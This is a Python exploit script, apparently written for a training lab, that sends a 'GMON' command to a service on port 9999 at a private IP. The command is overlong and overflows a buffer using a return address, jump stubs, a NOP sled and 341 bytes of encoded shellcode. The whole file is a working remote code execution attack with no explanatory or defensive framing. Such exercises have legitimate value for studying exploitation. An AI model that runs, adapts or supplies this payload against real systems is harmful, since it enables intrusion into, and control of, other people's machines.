#!/usr/bin/python

import socket

ip = '192.168.100.142'

#5010 causes crash
#buffer = "A"*5010

ret = "\xB3\x11\x50\x62" 
#625011B3   58               POP EAX
sjmp = "\xeb\xd0\x90\x90"
ljmp = "\xD9\xEE\xD9\x74\x24\xF4\x59\x80\xC1\x0A\x90\xFE\xCD\xFE\xCD\xFF\xE1"

#341 bytes
shell=(
"\xbe\x94\x83\xcb\xcb\xd9\xc1\xd9\x74\x24\xf4\x5d\x33\xc9" 
"\xb1\x4f\x31\x75\x14\x03\x75\x14\x83\xed\xfc\x76\x76\x37" 
"\x23\xff\x79\xc8\xb4\x9f\xf0\x2d\x85\x8d\x67\x25\xb4\x01" 
"\xe3\x6b\x35\xea\xa1\x9f\xce\x9e\x6d\xaf\x67\x14\x48\x9e" 
"\x78\x99\x54\x4c\xba\xb8\x28\x8f\xef\x1a\x10\x40\xe2\x5b" 
"\x55\xbd\x0d\x09\x0e\xc9\xbc\xbd\x3b\x8f\x7c\xbc\xeb\x9b" 
"\x3d\xc6\x8e\x5c\xc9\x7c\x90\x8c\x62\x0b\xda\x34\x08\x53" 
"\xfb\x45\xdd\x80\xc7\x0c\x6a\x72\xb3\x8e\xba\x4b\x3c\xa1" 
"\x82\x07\x03\x0d\x0f\x56\x43\xaa\xf0\x2d\xbf\xc8\x8d\x35" 
"\x04\xb2\x49\xb0\x99\x14\x19\x62\x7a\xa4\xce\xf4\x09\xaa" 
"\xbb\x73\x55\xaf\x3a\x50\xed\xcb\xb7\x57\x22\x5a\x83\x73" 
"\xe6\x06\x57\x1a\xbf\xe2\x36\x23\xdf\x4b\xe6\x81\xab\x7e" 
"\xf3\xb3\xf1\x16\x30\x89\x09\xe7\x5e\x9a\x7a\xd5\xc1\x30" 
"\x15\x55\x89\x9e\xe2\x9a\xa0\x66\x7c\x65\x4b\x96\x54\xa2" 
"\x1f\xc6\xce\x03\x20\x8d\x0e\xab\xf5\x01\x5f\x03\xa6\xe1" 
"\x0f\xe3\x16\x89\x45\xec\x49\xa9\x65\x26\xfc\xee\xf2\x09" 
"\x57\x94\x23\xe2\xaa\x54\x25\x49\x23\xb2\x4f\xbd\x62\x6d" 
"\xf8\x24\x2f\xe5\x99\xa9\xe5\x6d\x39\x3b\x62\x6d\x34\x20" 
"\x3d\x3a\x11\x96\x34\xae\x8f\x81\xee\xcc\x4d\x57\xc8\x54" 
"\x8a\xa4\xd7\x55\x5f\x90\xf3\x45\x99\x19\xb8\x31\x75\x4c" 
"\x16\xef\x33\x26\xd8\x59\xea\x95\xb2\x0d\x6b\xd6\x04\x4b" 
"\x74\x33\xf3\xb3\xc5\xea\x42\xcc\xea\x7a\x43\xb5\x16\x1b" 
"\xac\x6c\x93\x2b\xe7\x2c\xb2\xa3\xae\xa5\x86\xa9\x50\x10" 
"\xc4\xd7\xd2\x90\xb5\x23\xca\xd1\xb0\x68\x4c\x0a\xc9\xe1" 
"\x39\x2c\x7e\x01\x68")

buffer = "A"*1797 + "\x90"*(1500-341+150) + shell + "\x90"*50 + ljmp + sjmp + ret + "\x43"*(5010-2002-4)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ip,9999))
s.recv(1024)
s.send("GMON /.../" + buffer)
s.close
